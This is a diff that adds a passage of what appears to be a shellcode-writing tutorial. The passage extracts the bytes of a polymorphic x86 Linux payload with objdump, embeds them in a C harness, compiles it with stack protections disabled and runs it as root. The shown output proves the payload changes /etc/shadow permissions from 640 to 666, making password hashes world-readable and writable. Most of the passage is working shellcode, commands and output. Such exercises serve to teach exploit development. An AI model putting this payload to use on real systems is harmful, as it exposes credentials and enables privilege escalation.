@@ -91,3 +91,43 @@ _start:
   mov al, 0x1
   int 0x80
 ```
+Alright, let's extract the shellcode:
+```
+$ objdump -d ./poly1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x9f\xf5\x31\xc9\xf7\xe1\x04\x0f\x51\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe6\x87\xde\x66\x68\x6d\x01\x59\x83\xc1\x49\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
+
+keep in mind, we allow 7 opcodes per line
+```
+Let's paste this in shellcode.c:
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x9f\xf5\x31\xc9\xf7\xe1\x04\x0f\x51\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe6\x87\xde\x66\x68\x6d\x01\x59\x83\xc1\x49\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+```
+Let's compile and run:
+```
+$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+
+before shellcode execution, permissions of /etc/shadow:
+$ stat -c %a /etc/shadow                                                  
+640
+
+after:
+$ sudo ./shellcode
+Shellcode Length:  56
+$ stat -c %a /etc/shadow    
+666
+```
+The new length is 56 bytes, which is roughly a 70 percent increase in size. 
